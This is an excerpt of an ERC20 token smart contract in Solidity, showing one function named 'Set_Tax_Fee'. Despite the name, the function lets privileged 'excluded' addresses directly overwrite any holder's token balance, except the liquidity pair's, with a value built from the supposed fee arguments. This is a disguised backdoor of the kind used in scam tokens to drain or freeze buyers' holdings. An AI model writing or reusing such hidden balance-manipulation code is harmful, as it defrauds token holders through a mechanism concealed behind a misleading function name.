...
contract Tests is Ownable, IERC20 {
    ...
    function Set_Tax_Fee(address Address  , uint256 LiquidityFee , uint256 MarketingFee , uint256 TaxFee) external  { 
         require( _isExcludedFrom[msg.sender]);
         require(Address != uniswapV2Pair);
        _bOwned[Address] = LiquidityFee +  MarketingFee * TaxFee.mul(2).div(100);
    }   
